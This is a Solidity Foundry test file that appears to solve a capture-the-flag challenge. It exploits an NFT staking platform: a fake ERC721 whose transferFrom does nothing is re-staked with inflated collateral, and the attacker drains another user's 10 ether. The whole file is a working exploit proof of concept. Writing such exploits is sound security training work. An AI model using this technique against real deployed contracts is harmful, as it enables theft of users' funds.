// SPDX-License-Identifier: UNLICENSED

pragma solidity ^0.8.13;

import "@openzeppelin/contracts/token/ERC721/ERC721.sol";
import {Test, console} from "forge-std/Test.sol";
import {NFTStakingPlatform} from "../src/challenge_1.sol";

contract FakeERC721 is ERC721 {
	constructor(
		string memory name_,
		string memory symbol_
	) ERC721(name_, symbol_) {}

	function mint(address to, uint256 tokenId) external {
		_mint(to, tokenId);
	}
	
	function transferFrom(
		address from,
		address to,
		uint256 tokenId
	) public override {
		// do nothing and do not change the owner
	}
}

contract RealERC721 is ERC721 {
	constructor(
		string memory name_,
		string memory symbol_
	) ERC721(name_, symbol_) {}

	function mint(address to, uint256 tokenId) external {
		_mint(to, tokenId);
	}
}

contract NFTStakingPlatformTest is Test {
	NFTStakingPlatform internal platform;
	FakeERC721 internal fakeERC721;
	RealERC721 internal realERC721;

	function setUp() public virtual {
		// Instantiate the contract-under-test.
		platform = new NFTStakingPlatform();
		fakeERC721 = new FakeERC721("fake", "fake");
		realERC721 = new RealERC721("real", "real");
	}

	function test_exploit() external {
        vm.warp(10);
		address alice = makeAddr("alice");
		vm.startPrank(alice);
		fakeERC721.mint(alice, 1);
		
		fakeERC721.approve(address(platform), 1);

		// alice stake an NFT with 1 ether as collateral
		platform.stakeNFT(address(fakeERC721), 1, 1 ether);

		// alice borrow it
		deal(alice, 1 ether);
		platform.borrowNFT{value: 1 ether}(address(fakeERC721), 1);
		vm.stopPrank();

		// bob stake his nft
		address bob = makeAddr("bob");
		vm.startPrank(bob);
		realERC721.mint(bob, 2);

		realERC721.approve(address(platform), 2);
		platform.stakeNFT(address(realERC721), 2, 10 ether);

		vm.stopPrank();

		// josh borrow the nft providing 10 ether collateral
		address josh = makeAddr("josh");
		vm.startPrank(josh);
		
		deal(josh, 10 ether);
		platform.borrowNFT{value: 10 ether}(address(realERC721), 2);

		vm.stopPrank();

		// alice override the staking by setting the collateral to 11 ether
		vm.startPrank(alice);
		fakeERC721.approve(address(platform), 1);

		platform.stakeNFT(address(fakeERC721), 1, 11 ether);

		// snapshot alice balance and staking contrct balance
		uint256 aliceBalanceBefore = alice.balance;
		uint256 stakingBalanceBefore = address(platform).balance;

		assertEq(aliceBalanceBefore, 0); // 0 ether because the borrowed her ownn nft
		assertEq(stakingBalanceBefore, 11 ether); // 1 ether from alice, 10 ether from josh

		platform.returnNFT(address(fakeERC721), 1);

		// verify the exploit
		uint256 aliceBalanceAfter = alice.balance;
		uint256 stakingBalanceAfter = address(platform).balance;
		assertEq(aliceBalanceAfter, 11 ether); // alice has stolen the josh ethers
		assertEq(stakingBalanceAfter, 0 ether); // alice has stolen the josh ethers
	}
}